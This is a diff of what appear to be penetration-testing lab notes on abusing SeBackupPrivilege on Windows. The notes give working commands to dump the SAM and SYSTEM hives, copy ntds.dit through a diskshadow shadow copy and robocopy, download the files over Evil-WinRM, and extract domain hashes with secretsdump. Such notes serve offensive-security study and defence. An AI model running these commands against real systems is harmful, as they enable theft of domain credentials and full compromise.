@@ -1,11 +1,6 @@
 
 If an user has the SeBackupPrivilege enabled or is part of the Backup Operators group we can retrieve the SYSTEM & SAM files from registry hives or even copy the whole drive and back it up into an different drive to access sensitive files like SYSTEM & SAM.
-
 ## Registry Hive PoC
-
-```
-reg save hklm\sam <path>
-```
 
 ```
 reg save hklm\sam C:\Temp\SAM
@@ -14,8 +9,7 @@ reg save hklm\sam C:\Temp\SAM
 ```
 reg save hklm\system C:\Temp\SYSTEM
 ```
-
-## Evil-WinRM
+##### Evil-WinRM
 
 ```
 download SAM
@@ -25,7 +19,7 @@ download SAM
 download SYSTEM
 ```
 
-## Without Evil-WinRM
+##### Without Evil-WinRM
 
 On local machine:
 
@@ -86,4 +80,78 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [!] Press help for extra shell commands
 C:\>whoami
 clientwk222\administrator
+```
+
+---
+# Getting Domain Hashes
+
+I need to get Domain Hashes. I can only get them by getting access to the so called NTDS.dit file. Since this file is getting used by the AD itself all the time, it can't be extracted.  We need to create a so called "shadow copy". The extraction o the domain hashes also requires the SYSTEM hive, which I already retrieved.
+
+This template creates an snapshot or shadow copy of the C:\ Drive and exports it into an E:\ Drive. We can then view the NTDS.dit file in there and download it onto our local machine.
+
+Saved this content into an script.txt file on the local machine.
+
+```
+set verbose on  
+set metadata C:\Windows\Temp\test.cab  
+set context persistent  
+add volume C: alias cdrive  
+create  
+expose %cdrive% E:
+```
+
+Since Linux uses LF line endings and windows uses CRLF. We'll need to modify the script with another command in order to eliminate any errors.
+
+```
+unix2dos script.txt
+```
+
+We can now upload the script to the target.
+
+```
+upload script.txt
+```
+
+I then ran the windows in-built utility diskshadow.exe which allows me to create an copy of the C:\ Drive.
+
+```
+diskshadow /s script.txt
+```
+
+We can confirm if it worked.
+
+```
+dir E:\
+```
+
+To copy the NTDS.dit file we will utilize the windows in-built tool called "robocopy", because it is saver for big files.
+
+```
+robocopy /b E:\Windows\ntds . ntds.dit
+```
+
+This ensures that the Active Directory Database File is in our current Drive & Directory.
+
+I then downloaded the file to my local machine.
+
+```
+download ntds.dit
+```
+
+Extracting SYSTEM hive out of the registry.
+
+```
+reg save hklm\system C:\Temp\SYSTEM
+```
+
+Downloading the hive onto my local machin.
+
+```
+download SYSTEM
+```
+
+Utilized secretsdump.py in order to dump all domain hashes.
+
+```
+/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -ntds ntds.dit local
 ```
